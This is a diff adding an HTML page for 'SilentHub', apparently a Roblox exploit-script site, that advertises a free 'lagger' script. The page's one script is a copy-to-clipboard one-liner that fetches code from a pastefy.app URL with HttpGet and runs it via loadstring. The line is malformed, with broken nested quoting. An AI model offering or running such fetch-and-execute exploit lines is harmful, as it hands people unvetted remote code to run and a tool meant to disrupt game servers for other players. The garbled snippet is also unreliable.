@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Scripts | SilentHub</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: white;
+            font-family: Arial, sans-serif;
+            padding: 30px;
+        }
+        h1 {
+            text-align: center;
+            color: #a855f7;
+        }
+        .script {
+            background: #111;
+            padding: 20px;
+            border-radius: 16px;
+            margin: 30px auto;
+            max-width: 700px;
+        }
+        .script h2 {
+            margin-top: 0;
+        }
+        .script p {
+            opacity: 0.8;
+        }
+        pre {
+            background: #000;
+            padding: 15px;
+            border-radius: 12px;
+            overflow-x: auto;
+        }
+        button {
+            margin-top: 15px;
+            padding: 10px 18px;
+            border: none;
+            border-radius: 10px;
+            background: #a855f7;
+            color: black;
+            cursor: pointer;
+        }
+    </style>
+
+    <script>
+        function copyText(text) {
+            navigator.clipboard.writeText(text);
+            alert("Copied to clipboard!");
+        }
+    </script>
+</head>
+<body>
+
+<h1>Our Scripts</h1>
+
+<div class="script">
+    <h2>SilentHub Lagger</h2>
+    <p>very op lagger free and keyless.</p>
+
+    <pre id="script1">
+loadstring(game:HttpGet("loadstring(game:HttpGet("https://pastefy.app/9bSNQfhs/raw"))()"))()
+    </pre>
+
+    <button onclick="copyText(document.getElementById('script1').innerText)">
+        Copy
+    </button>
+</div>
+
+</body>
+</html>
